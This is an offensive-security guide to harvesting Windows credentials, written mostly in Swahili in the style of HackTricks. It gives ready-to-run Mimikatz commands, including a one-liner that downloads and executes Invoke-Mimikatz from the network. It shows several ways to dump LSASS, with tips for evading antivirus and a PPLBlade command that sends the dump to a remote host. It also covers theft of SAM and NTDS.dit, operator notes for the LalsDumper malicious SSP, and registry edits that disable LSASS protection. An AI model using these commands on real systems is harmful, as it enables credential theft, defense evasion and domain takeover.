# Kuiba Windows Credentials

{{#include ../../banners/hacktricks-training.md}}

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Pata mambo mengine ambayo Mimikatz inaweza kufanya katika** [**this page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Jifunze kuhusu baadhi ya uwezekano wa ulinzi wa credentials hapa.**](credentials-protections.md) **Ulinzi huu unaweza kuzuia Mimikatz kutoka kuchukua baadhi ya credentials.**

## Credentials na Meterpreter

Tumia [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **niliyounda** ili **kutafuta passwords na hashes** ndani ya victim.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Kuepuka AV

### Procdump + Mimikatz

Kwa kuwa **Procdump from** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**ni zana halali ya Microsoft**, haigunduliki na Defender.\
Unaweza kutumia zana hii ili **dump the lsass process**, **download the dump** na **extract** the **credentials locally** kutoka kwenye dump.

Unaweza pia kutumia [SharpDump](https://github.com/GhostPack/SharpDump).
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Mchakato huu unafanywa kiotomatiki kwa [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Kumbuka**: Baadhi ya **AV** inaweza **detect** kama **malicious** matumizi ya **procdump.exe to dump lsass.exe**, hii ni kwa sababu zinakuwa **detecting** string **"procdump.exe" and "lsass.exe"**. Kwa hivyo ni **stealthier** kupitisha kama **argument** **PID** ya lsass.exe kwa procdump **instead of** **jina lsass.exe.**

### Dumping lsass with **comsvcs.dll**

A DLL named **comsvcs.dll** found in `C:\Windows\System32` is responsible for **dumping process memory** in the event of a crash. This DLL includes a **function** named **`MiniDumpW`**, designed to be invoked using `rundll32.exe`.\
It is irrelevant to use the first two arguments, but the third one is divided into three components. The process ID to be dumped constitutes the first component, the dump file location represents the second, and the third component is strictly the word **full**. No alternative options exist.\
Upon parsing these three components, the DLL is engaged in creating the dump file and transferring the specified process's memory into this file.\
Utilization of the **comsvcs.dll** is feasible for dumping the lsass process, thereby eliminating the need to upload and execute procdump. This method is described in detail at [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

Amri ifuatayo inatumiwa kutekeleza:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Unaweza kuendesha mchakato huu kwa otomatiki kwa kutumia** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Kutorosha lsass kwa Task Manager**

1. Bofya kulia kwenye Task Bar kisha chagua Task Manager
2. Bofya More details
3. Tafuta mchakato "Local Security Authority Process" kwenye kichupo cha Processes
4. Bofya kulia kwenye mchakato "Local Security Authority Process" na uchague "Create dump file".

### Kutorosha lsass kwa procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) ni binary iliyosainiwa na Microsoft ambayo ni sehemu ya [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) suite.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass na PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) ni Protected Process Dumper Tool inayounga mkono obfuscating memory dump na kuhamisha kwenye remote workstations bila kuiweka kwenye diski.

**Vipengele muhimu**:

1. Bypassing PPL protection
2. Obfuscating memory dump files ili kuepuka Defender signature-based detection mechanisms
3. Uploading memory dump kwa RAW and SMB upload methods bila kuiweka kwenye diski (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP-based LSASS dumping without MiniDumpWriteDump

Ink Dragon inasambaza dumper ya hatua-tatu iitwayo **LalsDumper** ambayo haiwahi kuita `MiniDumpWriteDump`, kwa hivyo EDR hooks kwenye API hiyo hazitafanya kazi:

1. **Stage 1 loader (`lals.exe`)** – inatafuta `fdp.dll` kwa placeholder iliyoundwa na herufi 32 ndogo `d`, inaandika tena na path kamili kuelekea `rtu.txt`, inaifadhi DLL iliyopachikwa kama `nfdp.dll`, na inaita `AddSecurityPackageA("nfdp","fdp")`. Hii inalazimisha **LSASS** kupakia DLL hatarishi kama Security Support Provider (SSP) mpya.
2. **Stage 2 inside LSASS** – wakati LSASS inapopakia `nfdp.dll`, DLL husoma `rtu.txt`, inafanya XOR kila byte na `0x20`, na inaingiza blob iliyotafsiriwa kwenye kumbukumbu kabla ya kuhamisha utekelezaji.
3. **Stage 3 dumper** – payload iliyopakiwa inaotekeleza tena mantiki ya MiniDump kwa kutumia **direct syscalls** zilizotatuliwa kutoka kwa majina ya API yaliyohashiwa (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Export maalum iitwayo `Tom` inafungua `%TEMP%\<pid>.ddt`, inaandika dump ya LSASS iliyosimbwa ndani ya faili, na inafunga handle ili exfiltration iweze kufanyika baadaye.

Operator notes:

* Weka `lals.exe`, `fdp.dll`, `nfdp.dll`, na `rtu.txt` katika saraka moja. Stage 1 inaandika tena placeholder iliyowekwa hard-coded kwa path kamili ya `rtu.txt`, hivyo kuvitenganisha kunavunja mnyororo.
* Usajili hufanyika kwa kuongezea `nfdp` kwenye `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Unaweza kuweka thamani hiyo mwenyewe ili LSASS iupakie tena SSP kila boot.
* Mafaili ya `%TEMP%\*.ddt` ni dumps zilizosimbwa. Fungua (decompress) kwa ndani ya mashine, kisha uzitume kwa Mimikatz/Volatility kwa credential extraction.
* Kuendesha `lals.exe` kunahitaji haki za admin/SeTcb ili `AddSecurityPackageA` ifanikiwe; mara simu inaporejea, LSASS kwa uwazi inalosha SSP mbaya na inatekeleza Stage 2.
* Kuondoa DLL kutoka diski hakuitoi kutoka LSASS. Au futa entry ya registry na restart LSASS (reboot) au uiachie kwa uendelevu wa muda mrefu.

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump siri za LSA
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Dump the NTDS.dit kutoka target DC
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Kutoa historia ya nywila ya NTDS.dit kutoka kwenye DC lengwa
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Onyesha sifa ya pwdLastSet kwa kila akaunti ya NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

Faili hizi zinapaswa kuwa **zipo** katika _C:\windows\system32\config\SAM_ na _C:\windows\system32\config\SYSTEM._ Lakini **huwezi kuzinakili kwa njia ya kawaida** kwa sababu zimewalindwa.

### Kutoka kwa Registry

Njia rahisi ya steal faili hizo ni kupata nakala kutoka kwa Registry:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Pakua** faili hizo kwenye mashine yako ya Kali na **extract the hashes** kwa kutumia:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Unaweza kunakili faili zilizo na ulinzi ukitumia huduma hii. Unahitaji kuwa Administrator.

#### Using vssadmin

binary ya vssadmin inapatikana tu katika matoleo ya Windows Server
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Lakini unaweza kufanya vivyo hivyo kutoka kwa **Powershell**. Hii ni mfano wa **how to copy the SAM file** (diski ngumu iliyotumika ni "C:" na imehifadhiwa kwenye C:\users\Public) lakini unaweza kutumia hii kunakili faili yoyote iliyolindwa:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Msimbo kutoka kitabu: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

Hatimaye, unaweza pia kutumia [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) kufanya nakala ya SAM, SYSTEM na ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credentials - NTDS.dit**

The **NTDS.dit** file is known as the heart of **Active Directory**, holding crucial data about user objects, groups, and their memberships. It's where the **password hashes** for domain users are stored. This file is an **Extensible Storage Engine (ESE)** database and resides at **_%SystemRoom%/NTDS/ntds.dit_**.

Within this database, three primary tables are maintained:

- **Data Table**: This table is tasked with storing details about objects like users and groups.
- **Link Table**: It keeps track of relationships, such as group memberships.
- **SD Table**: **Security descriptors** for each object are held here, ensuring the security and access control for the stored objects.

More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows uses _Ntdsa.dll_ to interact with that file and its used by _lsass.exe_. Then, **part** of the **NTDS.dit** file could be located **inside the `lsass`** memory (you can find the latest accessed data probably because of the performance improve by using a **cache**).

#### Decrypting the hashes inside NTDS.dit

The hash is cyphered 3 times:

1. Decrypt Password Encryption Key (**PEK**) using the **BOOTKEY** and **RC4**.
2. Decrypt tha **hash** using **PEK** and **RC4**.
3. Decrypt the **hash** using **DES**.

**PEK** have the **same value** in **every domain controller**, but it is **cyphered** inside the **NTDS.dit** file using the **BOOTKEY** of the **SYSTEM file of the domain controller (is different between domain controllers)**. This is why to get the credentials from the NTDS.dit file **you need the files NTDS.dit and SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Copying NTDS.dit using Ntdsutil

Available since Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Unaweza pia kutumia [**volume shadow copy**](#stealing-sam-and-system) mbinu kunakili faili ya **ntds.dit**. Kumbuka kwamba pia utahitaji nakala ya **SYSTEM file** (tena, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) mbinu).

### **Kutoa hashes kutoka NTDS.dit**

Mara baada ya **kupata** faili **NTDS.dit** na **SYSTEM** unaweza kutumia zana kama _secretsdump.py_ ili **kutoa hashes**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Unaweza pia **kuviondoa kiotomatiki** kwa kutumia mtumiaji halali wa domain admin:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Kama **faili kubwa za NTDS.dit**, inashauriwa kuzichukua kwa kutumia [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Mwishowe, unaweza pia kutumia **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ au **mimikatz** `lsadump::lsa /inject`

### **Kutoa vitu vya domain kutoka NTDS.dit hadi database ya SQLite**

Vitu vya NTDS vinaweza kuchukuliwa hadi database ya SQLite kwa kutumia [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Sio tu secrets zinachukuliwa, bali pia vitu vyote kamili na sifa zao kwa ajili ya uchimbaji wa taarifa zaidi wakati faili mbichi ya NTDS.dit tayari imepatikana.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
The `SYSTEM` hive ni hiari lakini inaruhusu kuondolewa kwa siri zilizosimbwa (NT & LM hashes, supplemental credentials kama cleartext passwords, kerberos au trust keys, NT & LM password histories). Pamoja na taarifa nyingine, data zifuatazo zinachukuliwa: akaunti za watumiaji na za mashine pamoja na hashes zao, UAC flags, timestamp ya logon ya mwisho na mabadiliko ya password, maelezo ya akaunti, majina, UPN, SPN, vikundi na uanachama wa kurudia, mti wa organizational units na uanachama, trusted domains pamoja na aina za trusts, mwelekeo na sifa...

## Lazagne

Shusha binary kutoka [here](https://github.com/AlessandroZ/LaZagne/releases). Unaweza kutumia binary hii kutoa extract credentials kutoka kwa programu mbalimbali.
```
lazagne.exe all
```
## Zana nyingine za kutoa kredenshali kutoka SAM na LSASS

### Windows credentials Editor (WCE)

Zana hii inaweza kutumika kutoa kredenshali kutoka kwenye kumbukumbu. Pakua kutoka: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Inatoa kredenshali kutoka kwenye faili ya SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Toa credentials kutoka kwenye SAM file
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Pakua kutoka: [http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) na **itekeleze tu** na nywila zitatolewa.

## Mining idle RDP sessions and weakening security controls

Ink Dragon’s FinalDraft RAT ina tasker ya `DumpRDPHistory` ambayo mbinu zake ni muhimu kwa red-teamer yeyote:

### DumpRDPHistory-style telemetry collection

* **Outbound RDP targets** – chambua kila user hive katika `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Kila subkey huhifadhi jina la server, `UsernameHint`, na timestamp ya kuandikwa kwa mwisho. Unaweza kunakili mantiki ya FinalDraft kwa PowerShell:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – chunguza logi ya `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` kwa Event IDs **21** (successful logon) na **25** (disconnect) ili ramani ni nani alisimamia mashine:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Mara utakapo jua ni Domain Admin gani huungana mara kwa mara, fanya dump ya LSASS (kwa LalsDumper/Mimikatz) wakati kikao chao cha **disconnected** bado kipo. CredSSP + NTLM fallback huacha verifier na token zao ndani ya LSASS, ambazo kisha zinaweza kutumika tena kupitia SMB/WinRM ili kupata `NTDS.dit` au kuweka persistence kwenye domain controllers.

### Registry downgrades targeted by FinalDraft

Implant ile ile pia inaibadilisha funguo kadhaa za registry ili kurahisisha wizi wa vitambulisho (credentials):
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Kuweka `DisableRestrictedAdmin=1` kunalazimisha matumizi kamili ya cheti/tiketi wakati wa RDP, na hivyo kuwezesha pivoti za aina ya pass-the-hash.
* `LocalAccountTokenFilterPolicy=1` inafuta uchujaji wa token za UAC ili local admins wapate token zisizo na vizuizi kupitia mtandao.
* `DSRMAdminLogonBehavior=2` inaruhusu msimamizi wa DSRM kuingia wakati DC iko mtandaoni, ikimpa attackers akaunti nyingine ya built-in yenye mamlaka ya juu.
* `RunAsPPL=0` inatoa ulinzi wa LSASS PPL, na kufanya memory access kuwa rahisi kwa dumpers kama LalsDumper.

## Marejeo

- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
